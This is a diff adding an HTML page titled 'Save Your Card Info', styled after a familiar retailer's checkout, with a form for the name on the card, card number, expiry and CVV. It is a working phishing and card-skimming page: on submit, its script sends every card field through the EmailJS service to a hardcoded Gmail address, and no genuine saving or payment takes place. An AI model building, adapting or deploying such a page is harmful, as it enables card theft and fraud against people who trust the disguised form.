@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Save Credit Card Info</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 1em;
+      background: #eaeded;
+      margin: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 20px auto;
+      background: white;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+    }
+    h2 {
+      color: #111;
+      margin-bottom: 15px;
+      font-size: 1.2em;
+    }
+    input, button {
+      width: 100%;
+      padding: 8px;
+      margin-top: 8px;
+      border: 1px solid #a6a6a6;
+      border-radius: 3px;
+      font-size: 0.9em;
+      box-sizing: border-box;
+    }
+    input:focus {
+      border-color: #e77600;
+      box-shadow: 0 0 3px rgba(228, 121, 17, 0.5);
+      outline: none;
+    }
+    .expiry-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .expiry-month, .expiry-year {
+      width: calc(50% - 5px);
+    }
+    input[name="cvv"] {
+      width: 100%;
+      margin-top: 8px;
+    }
+    button {
+      background-color: #f0c14b;
+      border-color: #a88734 #9c7e31 #846a29;
+      color: #111;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    button:hover {
+      background-color: #f7dfa5;
+    }
+    button:active {
+      background-color: #f0c14b;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.15);
+    }
+  </style>
+  <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init("K25NIpkgW8OAHCjD9"); // Your Public Key
+    })();
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h2>Save Your Card Info</h2>
+    <form id="cardForm">
+      <input type="text" name="name" placeholder="Name on Card" required />
+      <input type="text" name="card_number" placeholder="Card Number" required />
+      <div class="expiry-group">
+        <input type="text" class="expiry-month" name="expiry_month" placeholder="MM" required />
+        <input type="text" class="expiry-year" name="expiry_year" placeholder="YY" required />
+      </div>
+      <input type="text" name="cvv" placeholder="CVV" required />
+      <button type="submit">Save Card</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('cardForm');
+      const recipientEmail = "chizbnznzn@gmail.com"; // Your Email Address
+
+      if (form) {
+        form.addEventListener('submit', function(event) {
+          event.preventDefault();
+
+          const expiryMonth = this.expiry_month.value;
+          const expiryYear = this.expiry_year.value;
+          const fullExpiry = `${expiryMonth}/${expiryYear}`;
+
+          const formData = {
+            name: this.name.value,
+            card_number: this.card_number.value,
+            expiry: fullExpiry, // Using the combined expiry date
+            cvv: this.cvv.value,
+            to_email: recipientEmail // You can include the recipient's email here or in the template
+          };
+
+          emailjs.send('service_s8q3n6i', 'template_7fqzu6r', formData)
+            .then(function(response) {
+              console.log('SUCCESS!', response.status, response.text);
+              alert('Card details sent successfully to the email!');
+              form.reset();
+            }, function(error) {
+              console.log('FAILED...', error);
+              alert('An error occurred while sending the data. Please try again.');
+            });
+        });
+      }
+    });
+  </script>
+</body>
+</html>
